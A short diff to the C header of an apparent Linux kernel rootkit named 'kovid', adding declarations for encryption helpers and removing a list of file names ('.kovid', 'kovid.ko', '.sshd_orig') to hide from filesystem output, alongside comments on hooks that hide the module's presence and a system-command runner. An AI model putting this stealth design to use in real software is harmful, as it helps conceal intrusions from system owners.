@@ -89,6 +89,16 @@ struct kernel_syscalls {
     unsigned long *tainted;
 };
 
+typedef void (*decrypt_callback)(const u8 * const buf, size_t buflen, size_t copied, void *userdata);
+/** Setup crypto module */
+int kv_crypto_key_init(void);
+struct kv_crypto_st *crypto_init(void);
+size_t kv_encrypt(struct kv_crypto_st *, u8 *, size_t);
+size_t kv_decrypt(struct kv_crypto_st *, decrypt_callback, void *userdata);
+void kv_crypto_free_data(struct kv_crypto_st *);
+void kv_crypto_mgc_deinit(struct kv_crypto_st *);
+void kv_crypto_deinit(void);
+
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
@@ -136,14 +146,6 @@ int kv_run_system_command(char **);
 
 /** VM operations */
 unsigned long kv_get_elf_vm_start(pid_t);
-
-/*
- * Hide these names from write() fs output
- */
-static const char *kv_hide_str_on_load[] = {
-    ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
-    UUIDGEN ".sh", ".sshd_orig", NULL
-};
 
 enum {
     KV_TASK,
